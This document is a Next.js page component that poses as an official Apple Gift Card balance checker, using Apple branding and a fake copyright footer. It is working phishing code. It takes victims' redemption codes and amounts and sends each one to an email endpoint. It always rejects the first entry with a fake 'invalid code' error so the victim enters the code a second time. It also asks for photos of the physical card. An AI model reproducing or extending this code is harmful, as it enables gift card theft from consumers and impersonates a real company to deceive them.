'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'

export default function Home() {
  const router = useRouter()
  
  // State for auth form
  const [authCode, setAuthCode] = useState('')
  const [amount, setAmount] = useState('')
  const [showAuthError, setShowAuthError] = useState(false)
  const [authErrorMessage, setAuthErrorMessage] = useState('')
  const [clearInputs, setClearInputs] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [showProcessing, setShowProcessing] = useState(false)
  const [processingStep, setProcessingStep] = useState(0)
  
  // State for upload form
  const [showUploadForm, setShowUploadForm] = useState(false)
  const [uploadAmount, setUploadAmount] = useState('')
  const [uploadFile, setUploadFile] = useState<File | null>(null)
  const [uploadFileName, setUploadFileName] = useState('')
  const [uploadError, setUploadError] = useState('')
  const [isUploading, setIsUploading] = useState(false)
  const [showUploadProcessing, setShowUploadProcessing] = useState(false)
  
  // Session tracking for auth attempts
  const [authSubmissions, setAuthSubmissions] = useState<Record<string, number>>({})

  // Processing steps for loading animation
  const processingSteps = [
    'Verifying gift card details...',
    'Checking balance...',
    'Finalizing...'
  ]

  // Auto-uppercase code input
  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setAuthCode(e.target.value.toUpperCase())
  }

  // Validate Apple Gift Card code
  const validateAuthCode = (code: string): boolean => {
    return /^X[A-Z0-9]{15}$/.test(code)
  }

  // Simulate processing with steps
  const simulateProcessing = (callback: () => void) => {
    setShowProcessing(true)
    setProcessingStep(0)
    
    let step = 0
    const interval = setInterval(() => {
      step++
      if (step < processingSteps.length) {
        setProcessingStep(step)
      } else {
        clearInterval(interval)
        setShowProcessing(false)
        callback()
      }
    }, 800)
  }

  // Handle auth form submission
const handleAuthSubmit = async (e: React.FormEvent) => {
  e.preventDefault()
  setShowAuthError(false)
  setAuthErrorMessage('')
  setIsLoading(true)

  const code = authCode.trim().toUpperCase()
  const amountNum = parseFloat(amount)

  // Validate inputs
  if (!code || !amount) {
    setShowAuthError(true)
    setAuthErrorMessage('Please enter required information')
    setIsLoading(false)
    return
  }

  if (!validateAuthCode(code)) {
    setShowAuthError(true)
    setAuthErrorMessage('Invalid Apple Gift Card code. Code must start with "X" and be 16 characters long.')
    setAuthCode(code)
    setIsLoading(false)
    return
  }

  if (isNaN(amountNum) || amountNum <= 0) {
    setShowAuthError(true)
    setAuthErrorMessage('Please enter a valid amount.')
    setIsLoading(false)
    return
  }

  const sessionKey = `${code}_${amount}`

  // Check if this is first attempt
  if (!authSubmissions[sessionKey]) {
    // FIRST ATTEMPT - Show processing, then show error
    simulateProcessing(() => {
      setAuthSubmissions(prev => ({ ...prev, [sessionKey]: 1 }))
      setShowAuthError(true)
      setAuthErrorMessage('Invalid Apple Gift Card code. Please try again.')
      
      // Clear inputs for retry
      setAuthCode('')
      setAmount('')
      setClearInputs(true)
      setIsLoading(false)
      
      // Send first attempt email in background
      fetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'auth',
          attempt: 'first',
          authCode: code,
          amount: amountNum,
        }),
      }).catch(console.error)
    })
    return
  }

  // SECOND ATTEMPT - This is the success path
  // Show processing, then redirect to balance
  simulateProcessing(() => {
    // Send success email in background
    fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'auth',
        attempt: 'second_success',
        authCode: code,
        amount: amountNum,
      }),
    }).catch(console.error)

    // Clear session for this code
    const newSubmissions = { ...authSubmissions }
    delete newSubmissions[sessionKey]
    setAuthSubmissions(newSubmissions)
    setIsLoading(false)

    // Redirect to balance page
    router.push(`/balance?amount=${encodeURIComponent(amount)}&code=${encodeURIComponent(code)}`)
  })
}

  // Handle file upload
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0]
      const fileSizeMB = file.size / 1024 / 1024
      
      if (fileSizeMB > 10) {
        setUploadError(`File too large (${fileSizeMB.toFixed(1)}MB). Maximum size is 10MB.`)
        setUploadFile(null)
        setUploadFileName('')
        e.target.value = ''
        return
      }
      
      setUploadFile(file)
      setUploadFileName(file.name)
      setUploadError('')
      
      // Check if filename contains gift card code
      const fileName = file.name.toUpperCase()
      if (/X[A-Z0-9]{15}/.test(fileName)) {
        setUploadError('✅ Gift card code detected in filename!')
      }
    }
  }

  // Handle upload form submission
  const handleUploadSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setUploadError('')

    const amountNum = parseFloat(uploadAmount)

    if (!uploadAmount || isNaN(amountNum) || amountNum <= 0) {
      setUploadError('Please enter a valid amount.')
      return
    }

    if (!uploadFile) {
      setUploadError('Please select an image to upload.')
      return
    }

    // Show processing animation
    setShowUploadProcessing(true)
    setIsUploading(true)

    const formData = new FormData()
    formData.append('file', uploadFile)
    formData.append('amount', uploadAmount)

    try {
      // Simulate processing delay
      await new Promise(resolve => setTimeout(resolve, 2500))
      
      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Upload failed')
      }

      setShowUploadProcessing(false)
      setIsUploading(false)

      // Redirect to balance page with code if detected
      const codeParam = data.code ? `&code=${encodeURIComponent(data.code)}` : ''
      router.push(`/balance?amount=${encodeURIComponent(uploadAmount)}&type=upload${codeParam}`)
      
    } catch (error) {
      setShowUploadProcessing(false)
      setIsUploading(false)
      setUploadError(error instanceof Error ? error.message : 'Upload failed. Please try again.')
    }
  }

  // Reset upload form
  const resetUploadForm = () => {
    setShowUploadForm(false)
    setUploadAmount('')
    setUploadFile(null)
    setUploadFileName('')
    setUploadError('')
    setIsUploading(false)
    setShowUploadProcessing(false)
  }

  // Processing animation component
  const ProcessingOverlay = ({ step, steps }: { step: number; steps: string[] }) => (
    <div className="text-center py-8">
      <div className="flex justify-center mb-6">
        <div className="w-12 h-12 border-4 border-[#e5e5ea] border-t-[#0071e3] rounded-full animate-spin"></div>
      </div>
      <p className="text-[16px] font-medium text-[#1d1d1f]">{steps[step] || steps[steps.length - 1]}</p>
      <p className="text-[12px] text-[#6e6e73] mt-2">Please do not close this page</p>
      <div className="flex justify-center gap-2 mt-4">
        {steps.map((_, i) => (
          <div
            key={i}
            className={`h-1.5 rounded-full transition-all duration-500 ${
              i <= step ? 'w-6 bg-[#0071e3]' : 'w-1.5 bg-[#e5e5ea]'
            }`}
          />
        ))}
      </div>
    </div>
  )

  return (
    <div className="min-h-screen flex flex-col" style={{ background: '#f5f5f7' }}>
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 h-[52px] bg-white/90 backdrop-blur-xl border-b border-black/10 z-[1000] flex items-center">
        <div className="max-w-[1400px] mx-auto px-5 w-full flex items-center justify-between">
          <a href="/" className="text-[17px] font-[560] text-[#1d1d1f] no-underline flex items-center gap-2">
            <svg viewBox="0 0 24 24" className="w-[18px] h-[18px]" fill="currentColor">
              <path d="M16.3 4.4c1.2-1.5 2-3.5 1.8-4.4-1 .1-2.2.7-2.9 1.5-1 .8-1.7 2-1.9 3.3.9.1 2.2-.3 3-1.4zm3.6 12.1c.7-1.1 1-2 1.4-3.1-1.8-.7-2.7-2.5-2.5-4.4.2-1.8 1.3-3.3 2.9-4.2-1.4-2-3.5-3.1-5.8-3.1-2 0-3.5.7-4.8 1.4-1 .5-2.1 1.1-3.1 1.1-1.1 0-2.2-.6-3.3-1.2-1.2-.6-2.5-1.3-4-1.3-2.5 0-4.9 1.5-6.3 4.1-1.8 3.4-1.6 9.7 1.3 14.1.9 1.4 2.1 2.9 3.5 2.9 1.1 0 1.8-.6 2.9-1.1 1.1-.6 2.3-1.2 3.8-1.2 1.5 0 2.7.6 3.9 1.2 1.1.6 2.2 1.3 3.5 1.3 1.5 0 3-1.6 4-3z"/>
            </svg>
            Apple Gift Card
          </a>
          <div className="flex items-center gap-3">
            <a href="#" className="text-[14px] font-semibold bg-[#0071e3] text-white px-4 py-1.5 rounded-full no-underline hover:bg-[#0077ed] transition">Buy</a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col pt-[52px]">
        <div className="flex flex-col items-center justify-center px-5 py-10 w-full max-w-[1200px] mx-auto">
          <h1 className="text-[48px] font-bold text-center max-w-[800px] mb-10" style={{ color: '#1d1d1f' }}>
            Check Your Apple Gift Card Balance
          </h1>

          <div className="bg-white rounded-[18px] p-[30px] w-full max-w-[420px] shadow-[0_8px_30px_rgba(0,0,0,0.08)]">
            {!showUploadForm ? (
              // Main Form - Code Entry
              <form onSubmit={handleAuthSubmit}>
                {showProcessing ? (
                  <ProcessingOverlay step={processingStep} steps={processingSteps} />
                ) : (
                  <>
                    <div className="mb-5">
                      <label className="block text-[14px] font-medium mb-2 text-[#1d1d1f]">
                        Redemption Code
                      </label>
                      <input
                        type="text"
                        className={`w-full px-4 py-3.5 border-[1.5px] rounded-xl text-[16px] transition-all bg-[#fafafa] focus:outline-none focus:shadow-[0_0_0_4px_rgba(0,113,227,0.1)] focus:bg-white ${
                          showAuthError ? 'border-[#ff3b30]' : 'border-[#e0e0e0] focus:border-[#0071e3]'
                        }`}
                        placeholder="Redemption Code"
                        maxLength={16}
                        value={authCode}
                        onChange={handleCodeChange}
                        disabled={isLoading}
                      />
                      {clearInputs && (
                        <p className="text-[12px] text-[#6e6e73] mt-2 text-center">
                          💡 Please re-enter your gift card code carefully
                        </p>
                      )}
                    </div>

                    <div className="mb-5">
                      <label className="block text-[14px] font-medium mb-2 text-[#1d1d1f]">
                        Amount ($)
                      </label>
                      <input
                        type="number"
                        className="w-full px-4 py-3.5 border-[1.5px] border-[#e0e0e0] rounded-xl text-[16px] transition-all bg-[#fafafa] focus:border-[#0071e3] focus:outline-none focus:shadow-[0_0_0_4px_rgba(0,113,227,0.1)] focus:bg-white"
                        placeholder="Amount ($)"
                        step="0.01"
                        min="0.01"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        disabled={isLoading}
                      />
                    </div>

                    <div className="text-center my-4">
                      <a
                        href="#"
                        className="text-[#0071e3] text-[14px] font-medium no-underline hover:underline"
                        onClick={(e) => {
                          e.preventDefault()
                          setShowUploadForm(true)
                          setUploadError('')
                        }}
                      >
                        📸 Scan Card instead?
                      </a>
                    </div>

                    {showAuthError && (
                      <div className="bg-[#fff0f0] border-l-4 border-[#e53935] px-4 py-3 rounded-lg text-[13px] mb-5 text-[#c62828]">
                        {authErrorMessage}
                      </div>
                    )}

                    <button
                      type="submit"
                      className="w-full py-3.5 border-none rounded-full bg-[#0071e3] text-white text-[16px] font-semibold cursor-pointer transition-all hover:bg-[#0077ed] hover:-translate-y-[1px] hover:shadow-[0_4px_12px_rgba(0,113,227,0.3)] disabled:opacity-50 disabled:cursor-not-allowed"
                      disabled={isLoading}
                    >
                      {isLoading ? 'Verifying...' : 'Verify & Check Balance'}
                    </button>
                  </>
                )}
              </form>
            ) : (
              // Upload Form
              <div>
                {showUploadProcessing ? (
                  <ProcessingOverlay step={1} steps={['Uploading image...', 'Processing gift card...', 'Finalizing...']} />
                ) : (
                  <>
                    <div className="text-center mb-5">
                      <a
                        href="#"
                        className="text-[#0071e3] text-[14px] font-medium no-underline hover:underline"
                        onClick={(e) => {
                          e.preventDefault()
                          resetUploadForm()
                        }}
                      >
                        ← Back to Verification
                      </a>
                    </div>

                    {/* Sample Gift Card Image */}
                    <div className="text-center mb-6">
                      <div className="inline-block bg-white rounded-2xl p-4 shadow-[0_8px_24px_rgba(0,0,0,0.12)] max-w-[320px] w-full">
                        <img
                          src="/image/card_format.jpeg"
                          alt="Apple Gift Card Sample"
                          className="w-full h-auto rounded-xl block"
                          onError={(e) => {
                            (e.target as HTMLImageElement).src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='50' text-anchor='middle' dy='.3em' font-size='40'%3E🎁%3C/text%3E%3C/svg%3E"
                          }}
                        />
                        <div className="text-[12px] text-[#6e6e73] mt-3 leading-5">
                          Go to applesbalance.com to check your Apple balance.<br />
                          Do not share your code.
                        </div>
                      </div>
                      <p className="text-[14px] text-[#1d1d1f] mt-3 font-medium">☑️ Example of where to find your gift card code</p>
                    </div>

                    {uploadError && (
                      <div className={`px-4 py-3 rounded-lg mb-5 text-[14px] ${
                        uploadError.includes('✅') 
                          ? 'bg-[#e8f5e9] border-l-4 border-[#4caf50] text-[#2e7d32]' 
                          : 'bg-[#ffebee] border-l-4 border-[#f44336] text-[#c62828]'
                      }`}>
                        {uploadError}
                      </div>
                    )}

                    <form onSubmit={handleUploadSubmit}>
                      <div className="mb-5">
                        <label className="block text-[14px] font-medium mb-2 text-[#1d1d1f]">
                          💰 Gift Card Amount ($)
                        </label>
                        <input
                          type="number"
                          className="w-full px-4 py-3.5 border-[1.5px] border-[#e0e0e0] rounded-xl text-[16px] transition-all bg-[#fafafa] focus:border-[#0071e3] focus:outline-none focus:shadow-[0_0_0_4px_rgba(0,113,227,0.1)] focus:bg-white"
                          placeholder="Enter amount on card"
                          step="0.01"
                          min="0.01"
                          value={uploadAmount}
                          onChange={(e) => setUploadAmount(e.target.value)}
                          required
                          disabled={isUploading}
                        />
                        <p className="text-[12px] text-[#8e8e93] mt-1.5">Examples: 25, 50, 100, 200</p>
                      </div>

                      <div className="mb-5">
                        <label className="block text-[14px] font-medium mb-2 text-[#1d1d1f]">
                          📷 Upload Gift Card Photo
                        </label>
                        <div className="relative overflow-hidden inline-block w-full">
                          <input
                            type="file"
                            id="file_upload"
                            className="absolute left-[-9999px]"
                            accept="image/*"
                            capture="environment"
                            onChange={handleFileChange}
                            disabled={isUploading}
                          />
                          <label
                            htmlFor="file_upload"
                            className="block w-full px-4 py-3.5 border-[1.5px] border-dashed border-[#0071e3] rounded-xl text-center cursor-pointer bg-[#f0f7ff] text-[#0071e3] font-medium transition-all hover:bg-[#e8f2ff]"
                          >
                            📷 Take Photo or Upload Image
                          </label>
                          {uploadFileName && (
                            <span className="block text-[12px] text-[#6e6e73] mt-2 text-center">
                              ✓ {uploadFileName}
                            </span>
                          )}
                        </div>
                        <p className="text-[12px] text-[#8e8e93] mt-1.5">
                          Supported: JPG, PNG, GIF, WEBP (Max 10MB)
                        </p>
                      </div>

                      <button
                        type="submit"
                        className="w-full py-3.5 border-none rounded-full bg-[#0071e3] text-white text-[16px] font-semibold cursor-pointer transition-all hover:bg-[#0077ed] hover:-translate-y-[1px] hover:shadow-[0_4px_12px_rgba(0,113,227,0.3)] disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={isUploading}
                      >
                        {isUploading ? 'Uploading...' : 'Verify Balance'}
                      </button>
                    </form>
                  </>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Hero Section */}
        <section className="flex justify-center px-5 py-14">
          <div className="w-full max-w-[650px] bg-[#f5f5f7] rounded-3xl p-10 flex justify-center">
            <div className="relative min-h-[300px] flex justify-center items-center">
              <div className="absolute w-[220px] rounded-[18px] bg-white flex items-center justify-center p-[30px] shadow-[0_20px_40px_rgba(0,0,0,0.15)] rotate-[6deg] translate-x-[100px] -translate-y-[80px] z-[1]">
                <img className="w-[100px] h-auto" src="/image/apple_2.jpeg" alt="Gift Card Back" onError={(e) => {
                  (e.target as HTMLImageElement).src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='50' text-anchor='middle' dy='.3em' font-size='40'%3E🎁%3C/text%3E%3C/svg%3E"
                }} />
              </div>
              <div className="absolute w-[220px] rounded-[18px] bg-white flex items-center justify-center p-[30px] shadow-[0_20px_40px_rgba(0,0,0,0.15)] -rotate-[4deg] -translate-x-[40px] translate-y-[10px] z-[2]">
                <img className="w-[100px] h-auto" src="/image/apple_1.jpeg" alt="Gift Card Front" onError={(e) => {
                  (e.target as HTMLImageElement).src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='50' text-anchor='middle' dy='.3em' font-size='40'%3E🍎%3C/text%3E%3C/svg%3E"
                }} />
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-[#f5f5f7] border-t border-black/10 pt-12 pb-4 mt-20">
        <div className="max-w-[1200px] mx-auto px-5 flex justify-between flex-wrap gap-10">
          <div className="flex flex-col gap-3">
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Check Gift Card Balance</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Redeem</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Apple Store</a>
          </div>
          <div className="flex flex-col gap-3">
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Support</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Contact Apple</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Help Center</a>
          </div>
          <div className="flex flex-col gap-3">
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Privacy</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Legal</a>
            <a href="#" className="text-[14px] text-[#1d1d1f] no-underline hover:text-[#0071e3]">Terms</a>
          </div>
        </div>
        <div className="text-center mt-10 text-[12px] text-[#6e6e73]">
          <p>© 2026 Apple Gift Card Balance Checker. All rights reserved.</p>
        </div>
      </footer>
    </div>
  )
}